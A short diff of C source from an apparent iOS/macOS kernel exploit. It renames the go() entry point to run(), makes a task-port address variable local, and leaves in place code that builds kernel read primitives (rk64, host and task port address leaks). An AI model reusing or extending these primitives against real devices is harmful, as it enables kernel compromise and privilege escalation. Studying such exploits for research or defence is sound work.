@@ -36,7 +36,6 @@ kern_return_t mach_vm_read_overwrite(
                                      mach_vm_address_t data,
                                      mach_vm_size_t *outsize);
 
-
 void increase_limits() {
   struct rlimit lim = {0};
   int err = getrlimit(RLIMIT_NOFILE, &lim);
@@ -581,8 +580,7 @@ uint64_t rk64(uint64_t kaddr) {
   return full;
 }
 
-uint64_t task_port_kaddr;
-mach_port_t go() {
+mach_port_t run() {
   offsets_init();
   
   // increase the limit on the number of open files:
@@ -768,7 +766,7 @@ mach_port_t go() {
   uint64_t host_port_kaddr = *((uint64_t*)(new_contents + 0x66c));
   
   // we can also find our task port kaddr:
-  task_port_kaddr = *((uint64_t*)(new_contents + 0x67c));
+  uint64_t task_port_kaddr = *((uint64_t*)(new_contents + 0x67c));
   
   mach_port_t kport = prepare_early_read_primitive(pipe_buf, replacer_pipe, replacer_pipe+1, replacer_port, new_contents);
   
